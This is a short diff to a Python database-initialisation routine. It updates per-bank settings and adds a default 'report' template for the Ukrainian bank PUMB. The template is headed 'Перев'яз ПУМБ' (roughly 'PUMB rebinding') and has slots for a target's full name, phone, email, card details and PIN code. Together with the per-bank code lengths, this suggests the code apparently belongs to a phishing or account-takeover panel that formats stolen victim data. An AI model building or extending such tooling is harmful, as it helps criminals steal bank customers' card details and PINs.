@@ -461,7 +461,8 @@ async def init_db():
         if BANK_TEMPLATES:
             await db.execute("UPDATE bank_templates SET code_length = 4 WHERE key = 'amobank' AND code_length = 6")
             await db.execute("UPDATE bank_templates SET code_length = 6 WHERE key = 'lvivbank' AND code_length = 4")
-            await db.execute("UPDATE bank_templates SET code_length = 6 WHERE key = 'bank.kd' AND code_length = 5")
+            pumb_default_report = "Перев'яз ПУМБ\n\n{pib}\n\n{target_phone}\n{target_email}\n\n{card_details}\n\n{pincode}"
+            await db.execute("UPDATE bank_templates SET report_template = ? WHERE key = 'pumb' AND (report_template IS NULL OR report_template LIKE '%{dob}%')", (pumb_default_report,))
 
             for key, val in BANK_TEMPLATES.items():
                 await db.execute(
